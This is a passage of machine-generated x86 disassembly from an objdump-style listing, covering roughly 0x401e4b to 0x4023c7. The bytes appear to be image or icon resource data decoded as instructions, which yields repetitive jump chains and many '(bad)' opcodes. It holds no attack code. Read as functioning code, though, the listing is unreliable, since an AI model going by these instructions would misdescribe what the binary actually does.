  401e4b:	eb eb                	jmp    0x401e38
  401e4d:	eb eb                	jmp    0x401e3a
  401e4f:	eb eb                	jmp    0x401e3c
  401e51:	eb eb                	jmp    0x401e3e
  401e53:	eb 09                	jmp    0x401e5e
  401e55:	ff                   	(bad)
  401e56:	ff                   	(bad)
  401e57:	ff f6                	push   %esi
  401e59:	ff                   	(bad)
  401e5a:	ff                   	(bad)
  401e5b:	ff 09                	decl   (%ecx)
  401e5d:	eb eb                	jmp    0x401e4a
  401e5f:	eb eb                	jmp    0x401e4c
  401e61:	eb eb                	jmp    0x401e4e
  401e63:	eb eb                	jmp    0x401e50
  401e65:	eb eb                	jmp    0x401e52
  401e67:	eb eb                	jmp    0x401e54
  401e69:	eb eb                	jmp    0x401e56
  401e6b:	eb f3                	jmp    0x401e60
  401e6d:	00 00                	add    %al,(%eax)
  401e6f:	00 00                	add    %al,(%eax)
  401e71:	00 00                	add    %al,(%eax)
  401e73:	eb eb                	jmp    0x401e60
  401e75:	eb eb                	jmp    0x401e62
  401e77:	eb eb                	jmp    0x401e64
  401e79:	eb eb                	jmp    0x401e66
  401e7b:	eb eb                	jmp    0x401e68
  401e7d:	eb eb                	jmp    0x401e6a
  401e7f:	eb eb                	jmp    0x401e6c
  401e81:	eb eb                	jmp    0x401e6e
  401e83:	eb eb                	jmp    0x401e70
  401e85:	09 ff                	or     %edi,%edi
  401e87:	ff                   	(bad)
  401e88:	ff                   	(bad)
  401e89:	ff                   	(bad)
  401e8a:	ff 09                	decl   (%ecx)
  401e8c:	eb eb                	jmp    0x401e79
  401e8e:	eb eb                	jmp    0x401e7b
  401e90:	eb eb                	jmp    0x401e7d
  401e92:	eb eb                	jmp    0x401e7f
  401e94:	eb eb                	jmp    0x401e81
  401e96:	eb eb                	jmp    0x401e83
  401e98:	eb eb                	jmp    0x401e85
  401e9a:	eb eb                	jmp    0x401e87
  401e9c:	eb 09                	jmp    0x401ea7
  401e9e:	00 00                	add    %al,(%eax)
  401ea0:	00 00                	add    %al,(%eax)
  401ea2:	09 eb                	or     %ebp,%ebx
  401ea4:	eb eb                	jmp    0x401e91
  401ea6:	eb eb                	jmp    0x401e93
  401ea8:	eb eb                	jmp    0x401e95
  401eaa:	eb eb                	jmp    0x401e97
  401eac:	eb eb                	jmp    0x401e99
  401eae:	eb eb                	jmp    0x401e9b
  401eb0:	eb eb                	jmp    0x401e9d
  401eb2:	eb eb                	jmp    0x401e9f
  401eb4:	eb eb                	jmp    0x401ea1
  401eb6:	f6 ff                	idiv   %bh
  401eb8:	ff                   	(bad)
  401eb9:	ff f6                	push   %esi
  401ebb:	f3 eb eb             	repz jmp 0x401ea9
  401ebe:	eb eb                	jmp    0x401eab
  401ec0:	eb eb                	jmp    0x401ead
  401ec2:	eb eb                	jmp    0x401eaf
  401ec4:	eb eb                	jmp    0x401eb1
  401ec6:	eb eb                	jmp    0x401eb3
  401ec8:	eb eb                	jmp    0x401eb5
  401eca:	eb eb                	jmp    0x401eb7
  401ecc:	eb 09                	jmp    0x401ed7
  401ece:	00 00                	add    %al,(%eax)
  401ed0:	00 00                	add    %al,(%eax)
  401ed2:	09 eb                	or     %ebp,%ebx
  401ed4:	eb eb                	jmp    0x401ec1
  401ed6:	eb eb                	jmp    0x401ec3
  401ed8:	eb eb                	jmp    0x401ec5
  401eda:	eb eb                	jmp    0x401ec7
  401edc:	eb eb                	jmp    0x401ec9
  401ede:	eb eb                	jmp    0x401ecb
  401ee0:	eb eb                	jmp    0x401ecd
  401ee2:	eb eb                	jmp    0x401ecf
  401ee4:	eb 09                	jmp    0x401eef
  401ee6:	ff                   	(bad)
  401ee7:	ff                   	(bad)
  401ee8:	ff                   	(bad)
  401ee9:	ff f6                	push   %esi
  401eeb:	eb eb                	jmp    0x401ed8
  401eed:	eb eb                	jmp    0x401eda
  401eef:	eb eb                	jmp    0x401edc
  401ef1:	eb eb                	jmp    0x401ede
  401ef3:	eb eb                	jmp    0x401ee0
  401ef5:	eb eb                	jmp    0x401ee2
  401ef7:	eb eb                	jmp    0x401ee4
  401ef9:	eb eb                	jmp    0x401ee6
  401efb:	eb eb                	jmp    0x401ee8
  401efd:	09 00                	or     %eax,(%eax)
  401eff:	00 00                	add    %al,(%eax)
  401f01:	00 09                	add    %cl,(%ecx)
  401f03:	eb eb                	jmp    0x401ef0
  401f05:	eb eb                	jmp    0x401ef2
  401f07:	eb eb                	jmp    0x401ef4
  401f09:	eb eb                	jmp    0x401ef6
  401f0b:	eb eb                	jmp    0x401ef8
  401f0d:	eb eb                	jmp    0x401efa
  401f0f:	eb eb                	jmp    0x401efc
  401f11:	eb eb                	jmp    0x401efe
  401f13:	eb f3                	jmp    0x401f08
  401f15:	f6 ff                	idiv   %bh
  401f17:	ff                   	(bad)
  401f18:	ff                   	(bad)
  401f19:	ff                   	(bad)
  401f1a:	ff 09                	decl   (%ecx)
  401f1c:	eb eb                	jmp    0x401f09
  401f1e:	eb eb                	jmp    0x401f0b
  401f20:	eb eb                	jmp    0x401f0d
  401f22:	eb eb                	jmp    0x401f0f
  401f24:	eb eb                	jmp    0x401f11
  401f26:	eb eb                	jmp    0x401f13
  401f28:	eb eb                	jmp    0x401f15
  401f2a:	eb eb                	jmp    0x401f17
  401f2c:	eb 09                	jmp    0x401f37
  401f2e:	00 00                	add    %al,(%eax)
  401f30:	00 00                	add    %al,(%eax)
  401f32:	09 eb                	or     %ebp,%ebx
  401f34:	eb eb                	jmp    0x401f21
  401f36:	eb eb                	jmp    0x401f23
  401f38:	eb eb                	jmp    0x401f25
  401f3a:	eb eb                	jmp    0x401f27
  401f3c:	eb eb                	jmp    0x401f29
  401f3e:	eb eb                	jmp    0x401f2b
  401f40:	eb eb                	jmp    0x401f2d
  401f42:	eb eb                	jmp    0x401f2f
  401f44:	09 ff                	or     %edi,%edi
  401f46:	ff                   	(bad)
  401f47:	ff f6                	push   %esi
  401f49:	ff                   	(bad)
  401f4a:	ff                   	(bad)
  401f4b:	ff 09                	decl   (%ecx)
  401f4d:	eb eb                	jmp    0x401f3a
  401f4f:	eb eb                	jmp    0x401f3c
  401f51:	eb eb                	jmp    0x401f3e
  401f53:	eb eb                	jmp    0x401f40
  401f55:	eb eb                	jmp    0x401f42
  401f57:	eb eb                	jmp    0x401f44
  401f59:	eb eb                	jmp    0x401f46
  401f5b:	eb eb                	jmp    0x401f48
  401f5d:	f3 00 00             	repz add %al,(%eax)
  401f60:	00 00                	add    %al,(%eax)
  401f62:	09 eb                	or     %ebp,%ebx
  401f64:	eb eb                	jmp    0x401f51
  401f66:	eb eb                	jmp    0x401f53
  401f68:	eb eb                	jmp    0x401f55
  401f6a:	eb eb                	jmp    0x401f57
  401f6c:	eb eb                	jmp    0x401f59
  401f6e:	eb eb                	jmp    0x401f5b
  401f70:	eb eb                	jmp    0x401f5d
  401f72:	eb 09                	jmp    0x401f7d
  401f74:	ff                   	(bad)
  401f75:	ff                   	(bad)
  401f76:	ff f6                	push   %esi
  401f78:	f3 09 ff             	repz or %edi,%edi
  401f7b:	ff f6                	push   %esi
  401f7d:	f3 eb eb             	repz jmp 0x401f6b
  401f80:	eb eb                	jmp    0x401f6d
  401f82:	eb eb                	jmp    0x401f6f
  401f84:	eb eb                	jmp    0x401f71
  401f86:	eb eb                	jmp    0x401f73
  401f88:	eb eb                	jmp    0x401f75
  401f8a:	eb eb                	jmp    0x401f77
  401f8c:	eb f3                	jmp    0x401f81
  401f8e:	00 00                	add    %al,(%eax)
  401f90:	00 00                	add    %al,(%eax)
  401f92:	09 eb                	or     %ebp,%ebx
  401f94:	eb eb                	jmp    0x401f81
  401f96:	eb eb                	jmp    0x401f83
  401f98:	eb eb                	jmp    0x401f85
  401f9a:	eb eb                	jmp    0x401f87
  401f9c:	eb eb                	jmp    0x401f89
  401f9e:	eb eb                	jmp    0x401f8b
  401fa0:	eb eb                	jmp    0x401f8d
  401fa2:	f3 f6 ff             	repz idiv %bh
  401fa5:	ff                   	(bad)
  401fa6:	ff 09                	decl   (%ecx)
  401fa8:	eb f3                	jmp    0x401f9d
  401faa:	f6 ff                	idiv   %bh
  401fac:	ff 09                	decl   (%ecx)
  401fae:	eb eb                	jmp    0x401f9b
  401fb0:	eb eb                	jmp    0x401f9d
  401fb2:	eb eb                	jmp    0x401f9f
  401fb4:	eb eb                	jmp    0x401fa1
  401fb6:	eb eb                	jmp    0x401fa3
  401fb8:	eb eb                	jmp    0x401fa5
  401fba:	eb eb                	jmp    0x401fa7
  401fbc:	eb eb                	jmp    0x401fa9
  401fbe:	00 00                	add    %al,(%eax)
  401fc0:	00 00                	add    %al,(%eax)
  401fc2:	f3 eb eb             	repz jmp 0x401fb0
  401fc5:	eb eb                	jmp    0x401fb2
  401fc7:	eb eb                	jmp    0x401fb4
  401fc9:	eb eb                	jmp    0x401fb6
  401fcb:	eb eb                	jmp    0x401fb8
  401fcd:	eb eb                	jmp    0x401fba
  401fcf:	eb eb                	jmp    0x401fbc
  401fd1:	eb 09                	jmp    0x401fdc
  401fd3:	ff                   	(bad)
  401fd4:	ff                   	(bad)
  401fd5:	ff 09                	decl   (%ecx)
  401fd7:	eb eb                	jmp    0x401fc4
  401fd9:	eb 09                	jmp    0x401fe4
  401fdb:	ff                   	(bad)
  401fdc:	ff                   	(bad)
  401fdd:	ff 09                	decl   (%ecx)
  401fdf:	eb eb                	jmp    0x401fcc
  401fe1:	eb eb                	jmp    0x401fce
  401fe3:	eb eb                	jmp    0x401fd0
  401fe5:	eb eb                	jmp    0x401fd2
  401fe7:	eb eb                	jmp    0x401fd4
  401fe9:	eb eb                	jmp    0x401fd6
  401feb:	eb eb                	jmp    0x401fd8
  401fed:	eb 00                	jmp    0x401fef
  401fef:	00 00                	add    %al,(%eax)
  401ff1:	00 f3                	add    %dh,%bl
  401ff3:	eb eb                	jmp    0x401fe0
  401ff5:	eb eb                	jmp    0x401fe2
  401ff7:	eb eb                	jmp    0x401fe4
  401ff9:	eb eb                	jmp    0x401fe6
  401ffb:	eb eb                	jmp    0x401fe8
  401ffd:	eb eb                	jmp    0x401fea
  401fff:	eb eb                	jmp    0x401fec
  402001:	09 ff                	or     %edi,%edi
  402003:	ff                   	(bad)
  402004:	ff f6                	push   %esi
  402006:	f3 eb eb             	repz jmp 0x401ff4
  402009:	eb eb                	jmp    0x401ff6
  40200b:	09 ff                	or     %edi,%edi
  40200d:	ff                   	(bad)
  40200e:	ff 09                	decl   (%ecx)
  402010:	eb eb                	jmp    0x401ffd
  402012:	eb eb                	jmp    0x401fff
  402014:	eb eb                	jmp    0x402001
  402016:	eb eb                	jmp    0x402003
  402018:	eb eb                	jmp    0x402005
  40201a:	eb eb                	jmp    0x402007
  40201c:	eb eb                	jmp    0x402009
  40201e:	f6 00 00             	testb  $0x0,(%eax)
  402021:	00 f3                	add    %dh,%bl
  402023:	eb eb                	jmp    0x402010
  402025:	eb eb                	jmp    0x402012
  402027:	eb eb                	jmp    0x402014
  402029:	eb eb                	jmp    0x402016
  40202b:	eb eb                	jmp    0x402018
  40202d:	eb eb                	jmp    0x40201a
  40202f:	eb 09                	jmp    0x40203a
  402031:	f6 ff                	idiv   %bh
  402033:	ff                   	(bad)
  402034:	ff 09                	decl   (%ecx)
  402036:	eb eb                	jmp    0x402023
  402038:	eb eb                	jmp    0x402025
  40203a:	eb eb                	jmp    0x402027
  40203c:	09 ff                	or     %edi,%edi
  40203e:	ff f6                	push   %esi
  402040:	f3 eb eb             	repz jmp 0x40202e
  402043:	eb eb                	jmp    0x402030
  402045:	eb eb                	jmp    0x402032
  402047:	eb eb                	jmp    0x402034
  402049:	eb eb                	jmp    0x402036
  40204b:	eb eb                	jmp    0x402038
  40204d:	eb ff                	jmp    0x40204e
  40204f:	00 00                	add    %al,(%eax)
  402051:	00 09                	add    %cl,(%ecx)
  402053:	eb eb                	jmp    0x402040
  402055:	eb eb                	jmp    0x402042
  402057:	eb eb                	jmp    0x402044
  402059:	eb eb                	jmp    0x402046
  40205b:	eb eb                	jmp    0x402048
  40205d:	eb eb                	jmp    0x40204a
  40205f:	eb 09                	jmp    0x40206a
  402061:	ff                   	(bad)
  402062:	ff                   	(bad)
  402063:	ff 09                	decl   (%ecx)
  402065:	eb eb                	jmp    0x402052
  402067:	eb eb                	jmp    0x402054
  402069:	eb eb                	jmp    0x402056
  40206b:	eb f3                	jmp    0x402060
  40206d:	f6 ff                	idiv   %bh
  40206f:	ff 09                	decl   (%ecx)
  402071:	eb eb                	jmp    0x40205e
  402073:	eb eb                	jmp    0x402060
  402075:	eb eb                	jmp    0x402062
  402077:	eb eb                	jmp    0x402064
  402079:	eb eb                	jmp    0x402066
  40207b:	eb eb                	jmp    0x402068
  40207d:	f3 00 00             	repz add %al,(%eax)
  402080:	00 00                	add    %al,(%eax)
  402082:	09 eb                	or     %ebp,%ebx
  402084:	eb eb                	jmp    0x402071
  402086:	eb eb                	jmp    0x402073
  402088:	eb eb                	jmp    0x402075
  40208a:	eb eb                	jmp    0x402077
  40208c:	eb eb                	jmp    0x402079
  40208e:	eb 09                	jmp    0x402099
  402090:	ff                   	(bad)
  402091:	ff                   	(bad)
  402092:	ff 09                	decl   (%ecx)
  402094:	eb eb                	jmp    0x402081
  402096:	eb eb                	jmp    0x402083
  402098:	eb eb                	jmp    0x402085
  40209a:	eb eb                	jmp    0x402087
  40209c:	eb 09                	jmp    0x4020a7
  40209e:	ff                   	(bad)
  40209f:	ff                   	(bad)
  4020a0:	ff 09                	decl   (%ecx)
  4020a2:	eb eb                	jmp    0x40208f
  4020a4:	eb eb                	jmp    0x402091
  4020a6:	eb eb                	jmp    0x402093
  4020a8:	eb eb                	jmp    0x402095
  4020aa:	eb eb                	jmp    0x402097
  4020ac:	eb f3                	jmp    0x4020a1
  4020ae:	00 00                	add    %al,(%eax)
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	09 eb                	or     %ebp,%ebx
  4020b4:	eb eb                	jmp    0x4020a1
  4020b6:	eb eb                	jmp    0x4020a3
  4020b8:	eb eb                	jmp    0x4020a5
  4020ba:	eb eb                	jmp    0x4020a7
  4020bc:	eb eb                	jmp    0x4020a9
  4020be:	09 09                	or     %ecx,(%ecx)
  4020c0:	09 09                	or     %ecx,(%ecx)
  4020c2:	09 09                	or     %ecx,(%ecx)
  4020c4:	eb eb                	jmp    0x4020b1
  4020c6:	eb eb                	jmp    0x4020b3
  4020c8:	eb eb                	jmp    0x4020b5
  4020ca:	eb eb                	jmp    0x4020b7
  4020cc:	eb eb                	jmp    0x4020b9
  4020ce:	09 09                	or     %ecx,(%ecx)
  4020d0:	09 09                	or     %ecx,(%ecx)
  4020d2:	09 eb                	or     %ebp,%ebx
  4020d4:	eb eb                	jmp    0x4020c1
  4020d6:	eb eb                	jmp    0x4020c3
  4020d8:	eb eb                	jmp    0x4020c5
  4020da:	eb eb                	jmp    0x4020c7
  4020dc:	eb 09                	jmp    0x4020e7
  4020de:	00 00                	add    %al,(%eax)
  4020e0:	00 00                	add    %al,(%eax)
  4020e2:	09 eb                	or     %ebp,%ebx
  4020e4:	eb eb                	jmp    0x4020d1
  4020e6:	eb eb                	jmp    0x4020d3
  4020e8:	eb eb                	jmp    0x4020d5
  4020ea:	eb eb                	jmp    0x4020d7
  4020ec:	eb eb                	jmp    0x4020d9
  4020ee:	eb eb                	jmp    0x4020db
  4020f0:	eb eb                	jmp    0x4020dd
  4020f2:	eb eb                	jmp    0x4020df
  4020f4:	eb eb                	jmp    0x4020e1
  4020f6:	eb eb                	jmp    0x4020e3
  4020f8:	eb eb                	jmp    0x4020e5
  4020fa:	eb eb                	jmp    0x4020e7
  4020fc:	eb eb                	jmp    0x4020e9
  4020fe:	eb eb                	jmp    0x4020eb
  402100:	eb eb                	jmp    0x4020ed
  402102:	eb eb                	jmp    0x4020ef
  402104:	eb eb                	jmp    0x4020f1
  402106:	eb eb                	jmp    0x4020f3
  402108:	eb eb                	jmp    0x4020f5
  40210a:	eb eb                	jmp    0x4020f7
  40210c:	eb 09                	jmp    0x402117
  40210e:	00 00                	add    %al,(%eax)
  402110:	00 00                	add    %al,(%eax)
  402112:	ff                   	ljmp   (bad)
  402113:	eb eb                	jmp    0x402100
  402115:	eb eb                	jmp    0x402102
  402117:	eb eb                	jmp    0x402104
  402119:	eb eb                	jmp    0x402106
  40211b:	eb eb                	jmp    0x402108
  40211d:	eb eb                	jmp    0x40210a
  40211f:	eb eb                	jmp    0x40210c
  402121:	eb eb                	jmp    0x40210e
  402123:	eb eb                	jmp    0x402110
  402125:	eb eb                	jmp    0x402112
  402127:	eb eb                	jmp    0x402114
  402129:	eb eb                	jmp    0x402116
  40212b:	eb eb                	jmp    0x402118
  40212d:	eb eb                	jmp    0x40211a
  40212f:	eb eb                	jmp    0x40211c
  402131:	eb eb                	jmp    0x40211e
  402133:	eb eb                	jmp    0x402120
  402135:	eb eb                	jmp    0x402122
  402137:	eb eb                	jmp    0x402124
  402139:	eb eb                	jmp    0x402126
  40213b:	eb eb                	jmp    0x402128
  40213d:	09 00                	or     %eax,(%eax)
  40213f:	00 00                	add    %al,(%eax)
  402141:	00 00                	add    %al,(%eax)
  402143:	09 eb                	or     %ebp,%ebx
  402145:	eb eb                	jmp    0x402132
  402147:	eb eb                	jmp    0x402134
  402149:	eb eb                	jmp    0x402136
  40214b:	eb eb                	jmp    0x402138
  40214d:	eb eb                	jmp    0x40213a
  40214f:	eb eb                	jmp    0x40213c
  402151:	eb eb                	jmp    0x40213e
  402153:	eb eb                	jmp    0x402140
  402155:	eb eb                	jmp    0x402142
  402157:	eb eb                	jmp    0x402144
  402159:	eb eb                	jmp    0x402146
  40215b:	eb eb                	jmp    0x402148
  40215d:	eb eb                	jmp    0x40214a
  40215f:	eb eb                	jmp    0x40214c
  402161:	eb eb                	jmp    0x40214e
  402163:	eb eb                	jmp    0x402150
  402165:	eb eb                	jmp    0x402152
  402167:	eb eb                	jmp    0x402154
  402169:	eb eb                	jmp    0x402156
  40216b:	eb f3                	jmp    0x402160
  40216d:	00 00                	add    %al,(%eax)
  40216f:	00 00                	add    %al,(%eax)
  402171:	00 00                	add    %al,(%eax)
  402173:	09 eb                	or     %ebp,%ebx
  402175:	eb eb                	jmp    0x402162
  402177:	eb eb                	jmp    0x402164
  402179:	eb eb                	jmp    0x402166
  40217b:	eb eb                	jmp    0x402168
  40217d:	eb eb                	jmp    0x40216a
  40217f:	eb eb                	jmp    0x40216c
  402181:	eb eb                	jmp    0x40216e
  402183:	eb eb                	jmp    0x402170
  402185:	eb eb                	jmp    0x402172
  402187:	eb eb                	jmp    0x402174
  402189:	eb eb                	jmp    0x402176
  40218b:	eb eb                	jmp    0x402178
  40218d:	eb eb                	jmp    0x40217a
  40218f:	eb eb                	jmp    0x40217c
  402191:	eb eb                	jmp    0x40217e
  402193:	eb eb                	jmp    0x402180
  402195:	eb eb                	jmp    0x402182
  402197:	eb eb                	jmp    0x402184
  402199:	eb eb                	jmp    0x402186
  40219b:	eb 09                	jmp    0x4021a6
  40219d:	00 00                	add    %al,(%eax)
  40219f:	00 00                	add    %al,(%eax)
  4021a1:	00 00                	add    %al,(%eax)
  4021a3:	ff f3                	push   %ebx
  4021a5:	eb eb                	jmp    0x402192
  4021a7:	eb eb                	jmp    0x402194
  4021a9:	eb eb                	jmp    0x402196
  4021ab:	eb eb                	jmp    0x402198
  4021ad:	eb eb                	jmp    0x40219a
  4021af:	eb eb                	jmp    0x40219c
  4021b1:	eb eb                	jmp    0x40219e
  4021b3:	eb eb                	jmp    0x4021a0
  4021b5:	eb eb                	jmp    0x4021a2
  4021b7:	eb eb                	jmp    0x4021a4
  4021b9:	eb eb                	jmp    0x4021a6
  4021bb:	eb eb                	jmp    0x4021a8
  4021bd:	eb eb                	jmp    0x4021aa
  4021bf:	eb eb                	jmp    0x4021ac
  4021c1:	eb eb                	jmp    0x4021ae
  4021c3:	eb eb                	jmp    0x4021b0
  4021c5:	eb eb                	jmp    0x4021b2
  4021c7:	eb eb                	jmp    0x4021b4
  4021c9:	eb eb                	jmp    0x4021b6
  4021cb:	eb 09                	jmp    0x4021d6
  4021cd:	00 00                	add    %al,(%eax)
  4021cf:	00 00                	add    %al,(%eax)
  4021d1:	00 00                	add    %al,(%eax)
  4021d3:	00 09                	add    %cl,(%ecx)
  4021d5:	eb eb                	jmp    0x4021c2
  4021d7:	eb eb                	jmp    0x4021c4
  4021d9:	eb eb                	jmp    0x4021c6
  4021db:	eb eb                	jmp    0x4021c8
  4021dd:	eb eb                	jmp    0x4021ca
  4021df:	eb eb                	jmp    0x4021cc
  4021e1:	eb eb                	jmp    0x4021ce
  4021e3:	eb eb                	jmp    0x4021d0
  4021e5:	eb eb                	jmp    0x4021d2
  4021e7:	eb eb                	jmp    0x4021d4
  4021e9:	eb eb                	jmp    0x4021d6
  4021eb:	eb eb                	jmp    0x4021d8
  4021ed:	eb eb                	jmp    0x4021da
  4021ef:	eb eb                	jmp    0x4021dc
  4021f1:	eb eb                	jmp    0x4021de
  4021f3:	eb eb                	jmp    0x4021e0
  4021f5:	eb eb                	jmp    0x4021e2
  4021f7:	eb eb                	jmp    0x4021e4
  4021f9:	eb eb                	jmp    0x4021e6
  4021fb:	09 00                	or     %eax,(%eax)
  4021fd:	00 00                	add    %al,(%eax)
  4021ff:	00 00                	add    %al,(%eax)
  402201:	00 00                	add    %al,(%eax)
  402203:	00 ff                	add    %bh,%bh
  402205:	f3 eb eb             	repz jmp 0x4021f3
  402208:	eb eb                	jmp    0x4021f5
  40220a:	eb eb                	jmp    0x4021f7
  40220c:	eb eb                	jmp    0x4021f9
  40220e:	eb eb                	jmp    0x4021fb
  402210:	eb eb                	jmp    0x4021fd
  402212:	eb eb                	jmp    0x4021ff
  402214:	eb eb                	jmp    0x402201
  402216:	eb eb                	jmp    0x402203
  402218:	eb eb                	jmp    0x402205
  40221a:	eb eb                	jmp    0x402207
  40221c:	eb eb                	jmp    0x402209
  40221e:	eb eb                	jmp    0x40220b
  402220:	eb eb                	jmp    0x40220d
  402222:	eb eb                	jmp    0x40220f
  402224:	eb eb                	jmp    0x402211
  402226:	eb eb                	jmp    0x402213
  402228:	eb eb                	jmp    0x402215
  40222a:	eb f6                	jmp    0x402222
	...
  402234:	00 09                	add    %cl,(%ecx)
  402236:	eb eb                	jmp    0x402223
  402238:	eb eb                	jmp    0x402225
  40223a:	eb f3                	jmp    0x40222f
  40223c:	09 09                	or     %ecx,(%ecx)
  40223e:	09 f6                	or     %esi,%esi
  402240:	00 09                	add    %cl,(%ecx)
  402242:	09 09                	or     %ecx,(%ecx)
  402244:	09 eb                	or     %ebp,%ebx
  402246:	eb eb                	jmp    0x402233
  402248:	eb eb                	jmp    0x402235
  40224a:	eb 09                	jmp    0x402255
  40224c:	09 09                	or     %ecx,(%ecx)
  40224e:	09 00                	or     %eax,(%eax)
  402250:	ff 09                	decl   (%ecx)
  402252:	09 09                	or     %ecx,(%ecx)
  402254:	f3 eb eb             	repz jmp 0x402242
  402257:	eb eb                	jmp    0x402244
  402259:	eb 09                	jmp    0x402264
	...
  402263:	00 00                	add    %al,(%eax)
  402265:	00 09                	add    %cl,(%ecx)
  402267:	eb eb                	jmp    0x402254
  402269:	f3 09 ff             	repz or %edi,%edi
	...
  402274:	00 f6                	add    %dh,%dh
  402276:	09 eb                	or     %ebp,%ebx
  402278:	eb f3                	jmp    0x40226d
  40227a:	09 00                	or     %eax,(%eax)
	...
  402284:	00 09                	add    %cl,(%ecx)
  402286:	f3 eb eb             	repz jmp 0x402274
  402289:	09 00                	or     %eax,(%eax)
	...
  402297:	09 09                	or     %ecx,(%ecx)
	...
  4022a5:	00 00                	add    %al,(%eax)
  4022a7:	09 09                	or     %ecx,(%ecx)
	...
  4022b5:	00 00                	add    %al,(%eax)
  4022b7:	09 09                	or     %ecx,(%ecx)
  4022b9:	ff 00                	incl   (%eax)
  4022bb:	00 00                	add    %al,(%eax)
  4022bd:	00 00                	add    %al,(%eax)
  4022bf:	00 ff                	add    %bh,%bh
  4022c1:	ff                   	(bad)
  4022c2:	ff                   	(bad)
  4022c3:	ff                   	(bad)
  4022c4:	ff                   	(bad)
  4022c5:	fe 00                	incb   (%eax)
  4022c7:	00 ff                	add    %bh,%bh
  4022c9:	ff                   	(bad)
  4022ca:	fc                   	cld
  4022cb:	3f                   	aas
  4022cc:	ff                   	(bad)
  4022cd:	fe 00                	incb   (%eax)
  4022cf:	00 ff                	add    %bh,%bh
  4022d1:	ff e0                	jmp    *%eax
  4022d3:	07                   	pop    %es
  4022d4:	ff                   	(bad)
  4022d5:	fe 00                	incb   (%eax)
  4022d7:	00 ff                	add    %bh,%bh
  4022d9:	ff 80 01 ff fe 00    	incl   0xfeff01(%eax)
  4022df:	00 ff                	add    %bh,%bh
  4022e1:	fe 00                	incb   (%eax)
  4022e3:	00 7f fe             	add    %bh,-0x2(%edi)
  4022e6:	00 00                	add    %al,(%eax)
  4022e8:	ff                   	(bad)
  4022e9:	fc                   	cld
  4022ea:	00 00                	add    %al,(%eax)
  4022ec:	3f                   	aas
  4022ed:	fe 00                	incb   (%eax)
  4022ef:	00 ff                	add    %bh,%bh
  4022f1:	f8                   	clc
  4022f2:	00 00                	add    %al,(%eax)
  4022f4:	1f                   	pop    %ds
  4022f5:	fe 00                	incb   (%eax)
  4022f7:	00 ff                	add    %bh,%bh
  4022f9:	f0 00 00             	lock add %al,(%eax)
  4022fc:	07                   	pop    %es
  4022fd:	fe 00                	incb   (%eax)
  4022ff:	00 ff                	add    %bh,%bh
  402301:	e0 00                	loopne 0x402303
  402303:	00 03                	add    %al,(%ebx)
  402305:	fe 00                	incb   (%eax)
  402307:	00 ff                	add    %bh,%bh
  402309:	c0 00 00             	rolb   $0x0,(%eax)
  40230c:	03 fe                	add    %esi,%edi
  40230e:	00 00                	add    %al,(%eax)
  402310:	ff 80 00 00 01 fe    	incl   -0x1ff0000(%eax)
  402316:	00 00                	add    %al,(%eax)
  402318:	ff 00                	incl   (%eax)
  40231a:	00 00                	add    %al,(%eax)
  40231c:	00 fe                	add    %bh,%dh
  40231e:	00 00                	add    %al,(%eax)
  402320:	fe 00                	incb   (%eax)
  402322:	00 00                	add    %al,(%eax)
  402324:	00 7e 00             	add    %bh,0x0(%esi)
  402327:	00 fe                	add    %bh,%dh
  402329:	00 00                	add    %al,(%eax)
  40232b:	00 00                	add    %al,(%eax)
  40232d:	7e 00                	jle    0x40232f
  40232f:	00 fc                	add    %bh,%ah
  402331:	00 00                	add    %al,(%eax)
  402333:	00 00                	add    %al,(%eax)
  402335:	3e 00 00             	add    %al,%ds:(%eax)
  402338:	fc                   	cld
  402339:	00 00                	add    %al,(%eax)
  40233b:	00 00                	add    %al,(%eax)
  40233d:	1e                   	push   %ds
  40233e:	00 00                	add    %al,(%eax)
  402340:	f8                   	clc
  402341:	00 00                	add    %al,(%eax)
  402343:	00 00                	add    %al,(%eax)
  402345:	1e                   	push   %ds
  402346:	00 00                	add    %al,(%eax)
  402348:	f8                   	clc
  402349:	00 00                	add    %al,(%eax)
  40234b:	00 00                	add    %al,(%eax)
  40234d:	0e                   	push   %cs
  40234e:	00 00                	add    %al,(%eax)
  402350:	f0 00 00             	lock add %al,(%eax)
  402353:	00 00                	add    %al,(%eax)
  402355:	0e                   	push   %cs
  402356:	00 00                	add    %al,(%eax)
  402358:	f0 00 00             	lock add %al,(%eax)
  40235b:	00 00                	add    %al,(%eax)
  40235d:	0e                   	push   %cs
  40235e:	00 00                	add    %al,(%eax)
  402360:	f0 00 00             	lock add %al,(%eax)
  402363:	00 00                	add    %al,(%eax)
  402365:	06                   	push   %es
  402366:	00 00                	add    %al,(%eax)
  402368:	e0 00                	loopne 0x40236a
  40236a:	00 00                	add    %al,(%eax)
  40236c:	00 06                	add    %al,(%esi)
  40236e:	00 00                	add    %al,(%eax)
  402370:	e0 00                	loopne 0x402372
  402372:	00 00                	add    %al,(%eax)
  402374:	00 06                	add    %al,(%esi)
  402376:	00 00                	add    %al,(%eax)
  402378:	e0 00                	loopne 0x40237a
  40237a:	00 00                	add    %al,(%eax)
  40237c:	00 06                	add    %al,(%esi)
  40237e:	00 00                	add    %al,(%eax)
  402380:	e0 00                	loopne 0x402382
  402382:	00 00                	add    %al,(%eax)
  402384:	00 02                	add    %al,(%edx)
  402386:	00 00                	add    %al,(%eax)
  402388:	c0 00 00             	rolb   $0x0,(%eax)
  40238b:	00 00                	add    %al,(%eax)
  40238d:	02 00                	add    (%eax),%al
  40238f:	00 c0                	add    %al,%al
  402391:	00 00                	add    %al,(%eax)
  402393:	00 00                	add    %al,(%eax)
  402395:	02 00                	add    (%eax),%al
  402397:	00 c0                	add    %al,%al
  402399:	00 00                	add    %al,(%eax)
  40239b:	00 00                	add    %al,(%eax)
  40239d:	02 00                	add    (%eax),%al
  40239f:	00 c0                	add    %al,%al
  4023a1:	00 00                	add    %al,(%eax)
  4023a3:	00 00                	add    %al,(%eax)
  4023a5:	02 00                	add    (%eax),%al
  4023a7:	00 c0                	add    %al,%al
  4023a9:	00 00                	add    %al,(%eax)
  4023ab:	00 00                	add    %al,(%eax)
  4023ad:	02 00                	add    (%eax),%al
  4023af:	00 c0                	add    %al,%al
  4023b1:	00 00                	add    %al,(%eax)
  4023b3:	00 00                	add    %al,(%eax)
  4023b5:	02 00                	add    (%eax),%al
  4023b7:	00 c0                	add    %al,%al
  4023b9:	00 00                	add    %al,(%eax)
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	02 00                	add    (%eax),%al
  4023bf:	00 c0                	add    %al,%al
  4023c1:	00 00                	add    %al,(%eax)
  4023c3:	00 00                	add    %al,(%eax)
  4023c5:	00 00                	add    %al,(%eax)
  4023c7:	00 c0                	add    %al,%al
